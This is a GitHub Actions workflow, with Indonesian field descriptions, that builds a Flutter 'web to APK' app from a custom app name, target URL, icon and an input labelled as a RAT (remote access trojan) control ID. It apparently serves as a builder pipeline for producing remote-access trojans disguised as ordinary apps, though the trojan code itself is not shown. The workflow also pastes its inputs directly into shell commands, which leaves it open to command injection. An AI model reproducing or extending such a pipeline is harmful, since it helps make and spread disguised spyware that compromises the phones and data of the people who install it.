name: Build Web to APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama Aplikasi (kosongkan kalau backend yang isi)'
        required: false
        default: ''
      target_url:
        description: 'URL Target (kosongkan kalau backend yang isi)'
        required: false
        default: ''
      control_id:
        description: 'ID Control RAT (kosongkan kalau backend yang isi)'
        required: false
        default: ''
      icon_url:
        description: 'URL Icon APK (kosongkan kalau backend yang isi)'
        required: false
        default: ''

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Java JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          flutter-version: '3.24.0'
          channel: 'stable'
          cache: true

      - name: Inject Config (ONLY if manual input)
        if: ${{ github.event.inputs.app_name != '' }}
        run: |
          mkdir -p assets
          cat <<EOF > assets/config.json
          {
            "app_name": "${{ github.event.inputs.app_name }}",
            "target_url": "${{ github.event.inputs.target_url }}",
            "control_id": "${{ github.event.inputs.control_id }}",
            "icon_url": "${{ github.event.inputs.icon_url }}"
          }
          EOF
          echo "✅ Config injected from manual input"

      - name: Verify Config
        run: |
          echo "📄 Current config.json:"
          cat assets/config.json

      - name: Download Custom Icon
        if: ${{ github.event.inputs.icon_url != '' }}
        run: |
          curl -L -o assets/icon.png "${{ github.event.inputs.icon_url }}"
          echo "✅ Icon downloaded"

      - name: Get Dependencies
        run: flutter pub get

      - name: Build APK Release
        run: flutter build apk --release

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: web2apk-${{ github.run_id }}
          path: build/app/outputs/flutter-apk/app-release.apk
          retention-days: 7
